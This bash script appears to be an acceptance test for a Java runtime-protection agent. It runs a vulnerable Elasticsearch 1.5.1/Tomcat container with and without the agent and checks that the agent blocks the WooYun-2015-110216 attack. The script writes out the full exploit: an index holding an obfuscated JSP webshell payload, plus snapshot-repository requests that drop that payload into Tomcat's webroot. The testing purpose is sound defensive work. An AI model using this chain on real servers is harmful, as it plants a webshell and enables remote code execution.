#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

image="${OHMYRASP_VULHUB_ELASTICSEARCH_110216_IMAGE:-vulhub/elasticsearch:1.5.1-with-tomcat}"
baseline_name="${OHMYRASP_VULHUB_ELASTICSEARCH_110216_BASELINE_NAME:-ohmyrasp-vulhub-elasticsearch-110216-baseline}"
protected_name="${OHMYRASP_VULHUB_ELASTICSEARCH_110216_PROTECTED_NAME:-ohmyrasp-vulhub-elasticsearch-110216-protected}"
baseline_es_port="${OHMYRASP_VULHUB_ELASTICSEARCH_110216_BASELINE_ES_PORT:-18586}"
baseline_tomcat_port="${OHMYRASP_VULHUB_ELASTICSEARCH_110216_BASELINE_TOMCAT_PORT:-18587}"
protected_es_port="${OHMYRASP_VULHUB_ELASTICSEARCH_110216_PROTECTED_ES_PORT:-18588}"
protected_tomcat_port="${OHMYRASP_VULHUB_ELASTICSEARCH_110216_PROTECTED_TOMCAT_PORT:-18589}"
baseline_cluster="${OHMYRASP_VULHUB_ELASTICSEARCH_110216_BASELINE_CLUSTER:-ohmyrasp-es110216-baseline}"
protected_cluster="${OHMYRASP_VULHUB_ELASTICSEARCH_110216_PROTECTED_CLUSTER:-ohmyrasp-es110216-protected}"
host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"
baseline_dir="logs/vulhub-elasticsearch-110216-java8-baseline"
protected_dir="logs/vulhub-elasticsearch-110216-java8-protected"
protected_log="${protected_dir}/events.jsonl"

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar

rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "$baseline_dir" "$protected_dir"
: > "$protected_log"
chmod 777 "$protected_dir"
chmod 666 "$protected_log"

cleanup() {
  docker logs "$baseline_name" > "${baseline_dir}/container.log" 2>&1 || true
  docker logs "$protected_name" > "${protected_dir}/container.log" 2>&1 || true
  docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

docker run -d --name "$baseline_name" \
  -p "127.0.0.1:${baseline_es_port}:9200" \
  -p "127.0.0.1:${baseline_tomcat_port}:8080" \
  "$image" elasticsearch -Des.cluster.name="$baseline_cluster" >/dev/null

docker run -d --name "$protected_name" \
  -p "127.0.0.1:${protected_es_port}:9200" \
  -p "127.0.0.1:${protected_tomcat_port}:8080" \
  -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
  -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
  -e "JAVA_TOOL_OPTIONS=-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java8.block=true" \
  "$image" elasticsearch -Des.cluster.name="$protected_cluster" >/dev/null

wait_for_es() {
  local name="$1"
  local port="$2"
  local output="$3"
  local status
  for _ in $(seq 1 180); do
    status="$(curl -sS -o "$output" -w "%{http_code}" \
      "http://127.0.0.1:${port}/" 2>/dev/null || true)"
    if [[ "$status" == "200" ]] && grep -q '"number" : "1.5.1"' "$output"; then
      return
    fi
    sleep 1
  done
  docker logs "$name" >&2 || true
  echo "${name} did not expose Elasticsearch 1.5.1 at ${port}" >&2
  exit 1
}

wait_for_tomcat() {
  local name="$1"
  local port="$2"
  local output="$3"
  local status
  for _ in $(seq 1 180); do
    status="$(curl -sS -o "$output" -w "%{http_code}" \
      "http://127.0.0.1:${port}/" 2>/dev/null || true)"
    if [[ "$status" == "200" ]] && grep -q 'Apache Tomcat' "$output"; then
      return
    fi
    sleep 1
  done
  docker logs "$name" >&2 || true
  echo "${name} did not expose Tomcat at ${port}" >&2
  exit 1
}

create_malicious_index() {
  local es_port="$1"
  local output="$2"
  local payload
  payload='{"<%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]{47,116,101,115,116,46,106,115,112})),new String(new byte[]{114,119})).write(request.getParameter(new String(new byte[]{102})).getBytes());%>":"test"}'
  curl -sS -XPOST -H "Content-Type: application/json" --data-binary "$payload" \
    -o "$output" -w "%{http_code}" \
    "http://127.0.0.1:${es_port}/yz.jsp/yz.jsp/1" || true
}

create_repository() {
  local es_port="$1"
  local output="$2"
  local body
  body='{"type":"fs","settings":{"location":"/usr/local/tomcat/webapps/wwwroot/","compress":false}}'
  curl -sS -XPUT -H "Content-Type: application/json" --data-binary "$body" \
    -o "$output" -w "%{http_code}" \
    "http://127.0.0.1:${es_port}/_snapshot/yz.jsp" || true
}

create_snapshot() {
  local es_port="$1"
  local output="$2"
  local body
  body='{"indices":"yz.jsp","ignore_unavailable":"true","include_global_state":false}'
  curl -sS -XPUT -H "Content-Type: application/json" --data-binary "$body" \
    -o "$output" -w "%{http_code}" \
    "http://127.0.0.1:${es_port}/_snapshot/yz.jsp/yz.jsp" || true
}

read_snapshot_artifact() {
  local tomcat_port="$1"
  local output="$2"
  curl -sS -i -o "$output" -w "%{http_code}" \
    "http://127.0.0.1:${tomcat_port}/wwwroot/indices/yz.jsp/snapshot-yz.jsp" || true
}

wait_for_es "$baseline_name" "$baseline_es_port" "${baseline_dir}/ready-es.response"
wait_for_es "$protected_name" "$protected_es_port" "${protected_dir}/ready-es.response"
wait_for_tomcat "$baseline_name" "$baseline_tomcat_port" "${baseline_dir}/ready-tomcat.response"
wait_for_tomcat "$protected_name" "$protected_tomcat_port" "${protected_dir}/ready-tomcat.response"

startup_count="$(grep -c '"event":"ohmyrasp-java8-agent-start"' "$protected_log" || true)"
if [[ "$startup_count" -lt 2 ]]; then
  cat "$protected_log" >&2 || true
  echo "missing Java 8 startup events for both Tomcat and Elasticsearch in protected WooYun-2015-110216 container" >&2
  exit 1
fi
if ! grep -q '"file_hook":"installed"' "$protected_log"; then
  cat "$protected_log" >&2
  echo "missing Java 8 file hook marker in protected WooYun-2015-110216 container" >&2
  exit 1
fi
if grep -q '"event":"ohmyrasp-detection"' "$protected_log"; then
  cat "$protected_log" >&2
  echo "protected WooYun-2015-110216 startup/readiness produced a detection before setup" >&2
  exit 1
fi

for side in baseline protected; do
  if [[ "$side" == "baseline" ]]; then
    es_port="$baseline_es_port"
    dir="$baseline_dir"
  else
    es_port="$protected_es_port"
    dir="$protected_dir"
  fi

  index_status="$(create_malicious_index "$es_port" "${dir}/index.response")"
  repo_status="$(create_repository "$es_port" "${dir}/repo.response")"
  if [[ "$index_status" != "201" || "$repo_status" != "200" ]] \
      || ! grep -q '"created":true' "${dir}/index.response" \
      || ! grep -q '"acknowledged":true' "${dir}/repo.response"; then
    cat "${dir}/index.response" >&2 || true
    cat "${dir}/repo.response" >&2 || true
    echo "WooYun-2015-110216 ${side} index/repository setup failed" >&2
    exit 1
  fi
done
if grep -q '"event":"ohmyrasp-detection"' "$protected_log"; then
  cat "$protected_log" >&2
  echo "protected WooYun-2015-110216 index/repository setup produced a detection before snapshot creation" >&2
  exit 1
fi

baseline_snapshot_status="$(create_snapshot "$baseline_es_port" "${baseline_dir}/snapshot.response")"
if [[ "$baseline_snapshot_status" != "200" ]] || ! grep -q '"accepted":true' "${baseline_dir}/snapshot.response"; then
  cat "${baseline_dir}/snapshot.response" >&2 || true
  echo "baseline WooYun-2015-110216 snapshot creation failed; status=${baseline_snapshot_status}" >&2
  exit 1
fi
for _ in $(seq 1 60); do
  if docker exec "$baseline_name" sh -c \
      'test -f /usr/local/tomcat/webapps/wwwroot/indices/yz.jsp/snapshot-yz.jsp && grep -q RandomAccessFile /usr/local/tomcat/webapps/wwwroot/indices/yz.jsp/snapshot-yz.jsp'; then
    break
  fi
  sleep 1
done
if ! docker exec "$baseline_name" sh -c \
    'test -f /usr/local/tomcat/webapps/wwwroot/indices/yz.jsp/snapshot-yz.jsp && grep -q RandomAccessFile /usr/local/tomcat/webapps/wwwroot/indices/yz.jsp/snapshot-yz.jsp'; then
  docker exec "$baseline_name" sh -c \
    'find /usr/local/tomcat/webapps/wwwroot -maxdepth 5 -type f -printf "%p\n" 2>/dev/null || true' >&2 || true
  echo "baseline WooYun-2015-110216 did not write the JSP snapshot artifact" >&2
  exit 1
fi
baseline_artifact_status="$(read_snapshot_artifact "$baseline_tomcat_port" "${baseline_dir}/artifact.response")"
if [[ "$baseline_artifact_status" == "000" || "$baseline_artifact_status" == "404" ]] \
    || ! grep -q 'RandomAccessFile' "${baseline_dir}/artifact.response"; then
  sed -n '1,120p' "${baseline_dir}/artifact.response" >&2 || true
  echo "baseline WooYun-2015-110216 snapshot artifact was not exposed through Tomcat" >&2
  exit 1
fi

protected_snapshot_status="$(create_snapshot "$protected_es_port" "${protected_dir}/snapshot.response")"
if [[ "$protected_snapshot_status" == "000" ]]; then
  cat "${protected_dir}/snapshot.response" >&2 || true
  echo "protected WooYun-2015-110216 snapshot request did not return an HTTP response" >&2
  exit 1
fi
if grep -q '"accepted":true' "${protected_dir}/snapshot.response"; then
  cat "${protected_dir}/snapshot.response" >&2
  echo "protected WooYun-2015-110216 snapshot succeeded despite Java8 RASP" >&2
  exit 1
fi
if ! grep -q '"algorithm":"java8_file_script_write".*"action":"block"' "$protected_log"; then
  cat "$protected_log" >&2
  echo "missing java8_file_script_write block event for WooYun-2015-110216" >&2
  exit 1
fi
if ! grep -q 'Java8RaspBlockException' "${protected_dir}/snapshot.response"; then
  cat "${protected_dir}/snapshot.response" >&2 || true
  echo "missing Java8RaspBlockException evidence for protected WooYun-2015-110216" >&2
  exit 1
fi
if docker exec "$protected_name" test -e /usr/local/tomcat/webapps/wwwroot/snapshot-yz.jsp; then
  echo "protected WooYun-2015-110216 wrote snapshot-yz.jsp despite Java8 RASP" >&2
  exit 1
fi
if docker exec "$protected_name" sh -c \
    'test -e /usr/local/tomcat/webapps/wwwroot/indices/yz.jsp/snapshot-yz.jsp'; then
  echo "protected WooYun-2015-110216 wrote the nested JSP snapshot artifact despite Java8 RASP" >&2
  exit 1
fi
protected_artifact_status="$(read_snapshot_artifact "$protected_tomcat_port" "${protected_dir}/artifact.response")"
if [[ "$protected_artifact_status" != "404" ]]; then
  sed -n '1,120p' "${protected_dir}/artifact.response" >&2 || true
  echo "protected WooYun-2015-110216 exposed a snapshot artifact after block" >&2
  exit 1
fi

echo "vulhub Elasticsearch WooYun-2015-110216 Java8 acceptance passed"
